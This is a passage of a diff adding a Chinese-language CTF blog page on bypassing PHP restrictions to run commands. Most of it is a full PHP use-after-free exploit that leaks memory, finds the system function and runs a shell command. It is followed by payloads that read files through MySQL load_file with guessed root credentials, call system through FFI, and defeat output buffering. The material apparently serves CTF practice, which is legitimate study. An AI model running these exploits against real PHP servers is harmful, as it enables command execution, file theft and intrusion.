+            $backtrace = (new Exception)-&gt;getTrace();
+            if(!isset($backtrace[1][&#39;args&#39;])) &#123;
+                $backtrace = debug_backtrace();
+            &#125;
+        &#125;
+    &#125;
+
+    class Helper &#123;
+        public $a, $b, $c, $d;
+    &#125;
+
+    function str2ptr(&amp;$str, $p = 0, $s = 8) &#123;
+        $address = 0;
+        for($j = $s-1; $j &gt;= 0; $j--) &#123;
+            $address &lt;&lt;= 8;
+            $address |= ord($str[$p+$j]);
+        &#125;
+        return $address;
+    &#125;
+
+    function ptr2str($ptr, $m = 8) &#123;
+        $out = &quot;&quot;;
+        for ($i=0; $i &lt; $m; $i++) &#123;
+            $out .= sprintf(&quot;%c&quot;,($ptr &amp; 0xff));
+            $ptr &gt;&gt;= 8;
+        &#125;
+        return $out;
+    &#125;
+
+    function write(&amp;$str, $p, $v, $n = 8) &#123;
+        $i = 0;
+        for($i = 0; $i &lt; $n; $i++) &#123;
+            $str[$p + $i] = sprintf(&quot;%c&quot;,($v &amp; 0xff));
+            $v &gt;&gt;= 8;
+        &#125;
+    &#125;
+
+    function leak($addr, $p = 0, $s = 8) &#123;
+        global $abc, $helper;
+        write($abc, 0x68, $addr + $p - 0x10);
+        $leak = strlen($helper-&gt;a);
+        if($s != 8) &#123; $leak %= 2 &lt;&lt; ($s * 8) - 1; &#125;
+        return $leak;
+    &#125;
+
+    function parse_elf($base) &#123;
+        $e_type = leak($base, 0x10, 2);
+
+        $e_phoff = leak($base, 0x20);
+        $e_phentsize = leak($base, 0x36, 2);
+        $e_phnum = leak($base, 0x38, 2);
+
+        for($i = 0; $i &lt; $e_phnum; $i++) &#123;
+            $header = $base + $e_phoff + $i * $e_phentsize;
+            $p_type  = leak($header, 0, 4);
+            $p_flags = leak($header, 4, 4);
+            $p_vaddr = leak($header, 0x10);
+            $p_memsz = leak($header, 0x28);
+
+            if($p_type == 1 &amp;&amp; $p_flags == 6) &#123;
+
+                $data_addr = $e_type == 2 ? $p_vaddr : $base + $p_vaddr;
+                $data_size = $p_memsz;
+            &#125; else if($p_type == 1 &amp;&amp; $p_flags == 5) &#123;
+                $text_size = $p_memsz;
+            &#125;
+        &#125;
+
+        if(!$data_addr || !$text_size || !$data_size)
+            return false;
+
+        return [$data_addr, $text_size, $data_size];
+    &#125;
+
+    function get_basic_funcs($base, $elf) &#123;
+        list($data_addr, $text_size, $data_size) = $elf;
+        for($i = 0; $i &lt; $data_size / 8; $i++) &#123;
+            $leak = leak($data_addr, $i * 8);
+            if($leak - $base &gt; 0 &amp;&amp; $leak - $base &lt; $data_addr - $base) &#123;
+                $deref = leak($leak);
+                
+                if($deref != 0x746e6174736e6f63)
+                    continue;
+            &#125; else continue;
+
+            $leak = leak($data_addr, ($i + 4) * 8);
+            if($leak - $base &gt; 0 &amp;&amp; $leak - $base &lt; $data_addr - $base) &#123;
+                $deref = leak($leak);
+                
+                if($deref != 0x786568326e6962)
+                    continue;
+            &#125; else continue;
+
+            return $data_addr + $i * 8;
+        &#125;
+    &#125;
+
+    function get_binary_base($binary_leak) &#123;
+        $base = 0;
+        $start = $binary_leak &amp; 0xfffffffffffff000;
+        for($i = 0; $i &lt; 0x1000; $i++) &#123;
+            $addr = $start - 0x1000 * $i;
+            $leak = leak($addr, 0, 7);
+            if($leak == 0x10102464c457f) &#123;
+                return $addr;
+            &#125;
+        &#125;
+    &#125;
+
+    function get_system($basic_funcs) &#123;
+        $addr = $basic_funcs;
+        do &#123;
+            $f_entry = leak($addr);
+            $f_name = leak($f_entry, 0, 6);
+
+            if($f_name == 0x6d6574737973) &#123;
+                return leak($addr + 8);
+            &#125;
+            $addr += 0x20;
+        &#125; while($f_entry != 0);
+        return false;
+    &#125;
+
+    function trigger_uaf($arg) &#123;
+
+        $arg = str_shuffle(&#39;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&#39;);
+        $vuln = new Vuln();
+        $vuln-&gt;a = $arg;
+    &#125;
+
+    if(stristr(PHP_OS, &#39;WIN&#39;)) &#123;
+        die(&#39;This PoC is for *nix systems only.&#39;);
+    &#125;
+
+    $n_alloc = 10;
+    $contiguous = [];
+    for($i = 0; $i &lt; $n_alloc; $i++)
+        $contiguous[] = str_shuffle(&#39;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&#39;);
+
+    trigger_uaf(&#39;x&#39;);
+    $abc = $backtrace[1][&#39;args&#39;][0];
+
+    $helper = new Helper;
+    $helper-&gt;b = function ($x) &#123; &#125;;
+
+    if(strlen($abc) == 79 || strlen($abc) == 0) &#123;
+        die(&quot;UAF failed&quot;);
+    &#125;
+
+    $closure_handlers = str2ptr($abc, 0);
+    $php_heap = str2ptr($abc, 0x58);
+    $abc_addr = $php_heap - 0xc8;
+
+    write($abc, 0x60, 2);
+    write($abc, 0x70, 6);
+
+    write($abc, 0x10, $abc_addr + 0x60);
+    write($abc, 0x18, 0xa);
+
+    $closure_obj = str2ptr($abc, 0x20);
+
+    $binary_leak = leak($closure_handlers, 8);
+    if(!($base = get_binary_base($binary_leak))) &#123;
+        die(&quot;Couldn&#39;t determine binary base address&quot;);
+    &#125;
+
+    if(!($elf = parse_elf($base))) &#123;
+        die(&quot;Couldn&#39;t parse ELF header&quot;);
+    &#125;
+
+    if(!($basic_funcs = get_basic_funcs($base, $elf))) &#123;
+        die(&quot;Couldn&#39;t get basic_functions address&quot;);
+    &#125;
+
+    if(!($zif_system = get_system($basic_funcs))) &#123;
+        die(&quot;Couldn&#39;t get zif_system address&quot;);
+    &#125;
+
+
+    $fake_obj_offset = 0xd0;
+    for($i = 0; $i &lt; 0x110; $i += 8) &#123;
+        write($abc, $fake_obj_offset + $i, leak($closure_obj, $i));
+    &#125;
+
+    write($abc, 0x20, $abc_addr + $fake_obj_offset);
+    write($abc, 0xd0 + 0x38, 1, 4);
+    write($abc, 0xd0 + 0x68, $zif_system);
+
+    ($helper-&gt;b)($cmd);
+    exit();
+&#125;
+
+ctfshow(&quot;cat /flag0.txt&quot;);ob_end_flush();
+</code></pre>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_44700621/article/details/125381763">使用PDO连接MySQL数据库</a></p>
+<blockquote>
+<p>先连接默认数据库<code>information_schema</code>达到命令执行的目录，只需要猜解出mysql的用户名和密码即可，以此获取数据库名</p>
+</blockquote>
+<pre><code class="php">$dsn = &quot;mysql:host=localhost;dbname=information_schema&quot;;
+$db = new PDO($dsn, &#39;root&#39;, &#39;root&#39;);
+$rs = $db-&gt;query(&quot;select group_concat(SCHEMA_NAME) from SCHEMATA&quot;);
+foreach($rs as $row)&#123;
+        echo($row[0]).&quot;|&quot;; 
+&#125;exit();
+</code></pre>
+<blockquote>
+<p>然后使用<code>load_file</code>函数读取信息</p>
+</blockquote>
+<pre><code class="php">try &#123;$dbh = new PDO(&#39;mysql:host=localhost;dbname=information_schema&#39;, &#39;root&#39;,&#39;root&#39;);
+        foreach($dbh-&gt;query(&#39;select load_file(&quot;/flag36.txt&quot;)&#39;) as $row)
+        &#123;echo($row[0]).&quot;|&quot;; &#125;$dbh = null;&#125;
+        catch (PDOException $e) &#123;echo $e-&gt;getMessage();exit(0);
+    &#125;
+exit(0);
+//information_schema改成要读取的数据库名
+</code></pre>
+<p><a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/ffi.cdef.php">FFI特性</a></p>
+<blockquote>
+<p>PHP&gt;&#x3D;7.4</p>
+</blockquote>
+<pre><code class="PHP">public static FFI::cdef(string $code = &quot;&quot;, ?string $lib = null): FFI
+    
+其中$code为一个字符串，包含常规C语言中的一系列声明，$lib为要加载和链接的共享库文件名称，如果省略lib，则平台将会尝试在全局范围内查找代码中声明的符号，其他系统将无法解析这些符号。
+</code></pre>
+<ul>
+<li>Payload</li>
+</ul>
+<pre><code class="php">$ffi = FFI::cdef(&quot;int system(const char *command);&quot;);//创建一个system对象
+$a=&#39;/readflag &gt; 1.txt&#39;;//没有回显的,需要访问1.txt
+$ffi-&gt;system($a);//通过$ffi去调用system函数
+</code></pre>
+<h5 id="ob-代码应对"><a href="#ob-代码应对" class="headerlink" title="ob_代码应对"></a><a target="_blank" rel="noopener" href="https://blog.csdn.net/Kracxi/article/details/121723791">ob_代码应对</a></h5><pre><code class="php">ob_get_contents();//返回输出缓冲区的内容
+ob_end_clean();//清空（擦除）缓冲区并关闭输出缓冲
+</code></pre>
+<ul>
+<li><p>绕过方法：</p>
+<p>执行完我们传入的代码然后直接结束程序不执行后面的代码</p>
+<pre><code class="php">die();
+exit(0);
+</code></pre>
+</li>
+</ul>
+
+    </div>
+    
+    
+    
+    
+    
+    
+    
+</div>
+
+                <footer id="footer">
+    <div id="footer-wrap">
+        <div>
+            &copy;
+            2022 - 2023 遗世独立の幻想乡
+            <span id="footer-icon">
+                <i class="fa-solid fa-font-awesome fa-fw"></i>
+            </span>
+            &commat;CloudFlowing
+        </div>
+        <div>
+            Based on the <a target="_blank" rel="noopener" href="https://hexo.io">Hexo Engine</a> &amp;
+            <a target="_blank" rel="noopener" href="https://github.com/argvchs/hexo-theme-particlex">ParticleX Theme</a>
+        </div>
+        
+    </div>
+</footer>
+
+            </div>
+            </transition>
+            
+            <transition name="fade">
+            <div id="preview" ref="preview" v-show="previewShow">
+                <img id="preview-content" ref="previewContent" />
+            </div>
+            </transition>
+            
+        </div>
+        <script src="/blog/js/main.js"></script>
+        
+        
+
+
+
+
+         
+    <script src="/blog/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"model":{"jsonPath":"/blog/live2dw/assets/z16.model.json"},"display":{"position":"left","width":150,"height":300},"mobile":{"show":false},"log":false,"pluginJsPath":"lib/","pluginModelPath":"assets/","pluginRootPath":"live2dw/","tagMode":false});</script></body>
+</html>
+
